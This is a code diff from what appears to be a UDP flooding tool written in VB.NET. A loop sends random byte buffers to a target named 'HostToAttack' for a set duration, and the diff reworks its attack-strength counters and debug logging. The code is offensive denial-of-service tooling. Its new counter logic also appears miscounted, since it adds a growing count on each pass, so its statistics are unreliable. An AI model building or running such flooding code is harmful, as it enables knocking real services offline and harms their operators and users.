@@ -67,8 +67,20 @@ Public Class UDP
             Dim stopwatch As Stopwatch = Stopwatch.StartNew
             Dim hostip As Net.IPAddress = Net.IPAddress.Parse(Net.Dns.GetHostAddresses(HostToAttack)(0).ToString())
             Dim hostep As New Net.IPEndPoint(hostip, Port)
-
+            Dim count As Integer = 0
+            Dim UploadLength As Integer = msgLength
+            Dim DownloadLength As Integer = 0
             Do While (stopwatch.Elapsed < span)
+                'FloodBase
+                GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + count)
+                GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * UploadLength)
+                GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * DownloadLength)
+                count += 1
+                If Config.Variables.Debug Then
+                    Console.WriteLine("Count: " & GetFloodsBase.Get_AttackCount() & " Download byte: " & GetFloodsBase.GetAttackDownStrengOnByte() & "->" & GetFloodsBase.GetAttackDownStrengOnByteOnSec() & "/Sec Upload byte: " & GetFloodsBase.GetAttackUpStrengOnByte() & "->" & GetFloodsBase.GetAttackUpStrengOnByteOnSec() & "/Sec")
+                End If
+
+                'Worker
                 Try
                     Dim random As New Random
                     Dim buffer As Byte() = New Byte(msgLength - 1) {}
@@ -81,8 +93,6 @@ Public Class UDP
                     udpc.Connect(hostep)
                     udpc.SendTo(buffer, hostep)
 
-                    GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
-                    GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * msgLength)
                     Dim bytes As Integer = 0
                     Dim sb = New StringBuilder()
                     Dim bytesReceived As Byte() = New Byte(255) {}
@@ -92,7 +102,9 @@ Public Class UDP
                         sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                     Loop Until bytes > 0
 
-                    GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
+                    If DownloadLength = 0 Then
+                        DownloadLength = sb.ToString().Length()
+                    End If
 
                     udpc.Close()
                     Continue Do
